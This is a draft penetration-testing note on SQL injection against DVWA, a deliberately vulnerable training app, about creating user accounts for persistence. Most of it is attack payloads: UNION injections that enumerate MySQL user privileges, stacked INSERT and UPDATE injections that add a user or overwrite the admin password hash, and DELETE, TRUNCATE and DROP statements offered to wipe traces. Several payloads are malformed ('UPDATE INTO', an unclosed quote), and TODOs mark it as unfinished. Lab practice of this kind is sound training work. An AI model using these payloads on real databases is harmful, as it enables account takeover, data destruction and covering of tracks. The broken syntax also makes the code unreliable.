---
author(s):
  - Userware
tags:
  - webapp-pentesting
  - initial-access
  - post-exploitation
  - server-side-attack
  - sql-injection
  - union
  - enumeration-and-discovery
  - maintaining-access
  - persistence
  - webshell
  - dvwa
---
# 01 - Create User Account

TODO: Figure out using SQL queries to create a user account in the current database, and create a database user account for the DBMS server

## 1.1 - Current Database User Account

> [!IMPORTANT] Conditions
> The DB user must have **SELECT, INSERT, UPDATE, DELETE, DROP** privileges.

### 1.1.1 - Enumerate Database User Privileges

```sql
' UNION SELECT NULL, GROUP_CONCAT(user, '->', 'SELECT', '->', Select_priv, '\n', user, '->', 'INSERT', '->', Insert_priv, '\n', user, '->', 'UPDATE', '->', Update_priv, '\n', user, '->', 'DELETE', '->', Delete_priv, '\n', user, '->', 'DROP', '->', Drop_priv) FROM mysql.user#

' UNION SELECT NULL, GROUP_CONCAT(user, '->', 'SELECT', '->', Select_priv, '\n', user, '->', 'INSERT', '->', Insert_priv, '\n', user, '->', 'UPDATE', '->', Update_priv, '\n', user, '->', 'DELETE', '->', Delete_priv, '\n', user, '->', 'DROP', '->', Drop_priv) FROM mysql.user WHERE user = 'dvwa'#

' UNION SELECT NULL, CONCAT(user, '->', 'SELECT', '->', Select_priv, '\n', user, '->', 'INSERT', '->', Insert_priv, '\n', user, '->', 'UPDATE', '->', Update_priv, '\n', user, '->', 'DELETE', '->', Delete_priv, '\n', user, '->', 'DROP', '->', Drop_priv) FROM mysql.user WHERE Select_priv = 'Y' OR Insert_priv = 'Y' OR Update_priv = 'Y' OR Delete_priv = 'Y' OR Drop_priv = 'Y'#

' UNION SELECT NULL, GROUP_CONCAT(PRIVILEGE_TYPE, '->', GRANTEE, '->', IS_GRANTABLE, '<br>') FROM information_schema.USER_PRIVILEGES#

' UNION SELECT NULL, GROUP_CONCAT(PRIVILEGE_TYPE, '->', GRANTEE, '->', IS_GRANTABLE, '<br>') FROM information_schema.USER_PRIVILEGES WHERE GRANTEE LIKE "'dvwa'%"#

' UNION SELECT NULL, GROUP_CONCAT(PRIVILEGE_TYPE, '->', GRANTEE, '->', IS_GRANTABLE, '<br>') FROM information_schema.USER_PRIVILEGES WHERE PRIVILEGE_TYPE LIKE 'SELECT' OR PRIVILEGE_TYPE LIKE 'INSERT' OR PRIVILEGE_TYPE LIKE 'UPDATE' OR PRIVILEGE_TYPE LIKE 'DELETE' OR PRIVILEGE_TYPE LIKE 'DROP' AND GRANTEE LIKE "'dvwa'%"#
```

### 1.1.2 - INSERT values

```
' INSERT INTO dvwa.users values()#

; INSERT INTO dvwa.users values()#
```

### 1.1.3 - UPDATE values

```
' UPDATE INTO dvwa.users values()#

; UPDATE dvwa.users SET password="<new_md5_hash> WHERE user='admin'#
```

### 1.1.4 - Clean Traces

- DELETE Query after INSERTing

- UPDATE Query

TODO: Demonstrate it to wipe traces in the DB when you insert values

```sql
SELECT * FROM <database_name>.<table_name>;

' UNION SELECT * NULL FROM <database_name>.<table_name>#
```

Empty the table with the DELETE Statement

```sql
DELETE FROM <database_name>.<table_name>
```

Empty the table with the TRUNCATE Statement

```sql
TRUNCATE TABLE <database_name>.<table_name>;
```

```sql
DROP TABLE <database_name>.<table_name>;
```

## 1.2 - DBMS User Account

> [!IMPORTANT] Conditions
> The DB user must have **SELECT, INSERT, CREATE, ALTER, UPDATE, DELETE** privileges.